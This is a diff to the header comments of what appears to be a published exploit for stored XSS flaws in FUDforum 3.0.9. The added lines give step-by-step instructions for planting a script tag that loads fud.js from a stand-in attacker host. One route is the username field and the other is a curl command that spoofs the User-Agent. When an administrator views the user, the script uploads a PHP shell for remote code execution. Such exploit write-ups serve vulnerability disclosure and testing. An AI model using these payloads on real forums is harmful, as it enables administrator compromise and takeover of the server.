@@ -13,7 +13,19 @@
 // Greetz : wetw0rk, Fr13ndz, offsec =)
 //
 // Description: Multiple Stored XSS vulnerabilities have been found in FUDforum 3.0.9 that may result in remote code execution.
+//              The areas impacted are the admin panel and the forum.
 //
+//  XSS via username in Forum:
+//  1.  Register an account and log in to the forum.
+//  2.  Go to the user control panel. -> Account Settings -> change login
+//  3.  Insert javascript payload <script/src="http://attacker.machine/fud.js"></script>
+//  4.  When the admin visits the user information the payload will fire, uploading a php shell on the remote system.
+//
+//  XSS via user-agent in Admin Panel:
+//  1.  Register an account and log in to the forum. If you have an IP already associated with a registered user this is not required. This step is so when you run the XSS payload from your attacker machine it gets logged under the user activity.
+//  2.  Send the XSS payload below (from an IP associated with an account) / host the script:
+//  3.  curl -A '<script src="http://attacker.machine/fud.js"></script>' http://target.machine/fudforum/index.php
+//  4.  When the admin visits the user information from the admin controls / User Manager the payload will fire under "Recent sessions", uploading a php shell on the remote system.
 //
 
 function patience()
